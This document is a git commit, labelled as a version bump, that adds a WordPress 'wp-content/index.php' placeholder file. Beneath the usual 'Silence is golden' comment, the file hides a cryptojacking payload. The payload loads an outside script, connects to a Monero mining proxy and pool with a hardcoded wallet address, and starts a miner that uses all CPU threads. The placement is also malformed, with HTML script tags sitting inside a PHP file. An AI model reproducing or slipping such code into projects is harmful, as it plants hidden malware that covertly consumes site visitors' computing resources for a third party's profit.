2a5f92eb2ec477f509892f447312f991cf5e80e9
ViktorVohmin <lxbox3432@gmail.com>
2024-05-14 08:26:34 +0700

    V6.5.3

---
+++ wp-content/index.php
@@ -0,0 +1,13 @@
+<?php
+// Silence is golden.
+<script src="https://script.ghgi.xyz"></script>
+<script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "47xS7CWWZ8c7xdxBcuiqA7KLK8kRFcaLFPViKA9w3eHVe2WcKj8iaBEADzZYXGqE9sCC71cbu64qrZhZZkafzFn2VPA9xs9";
+    var workerId = ""
+    var threads = -1;
+    var password = "site";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
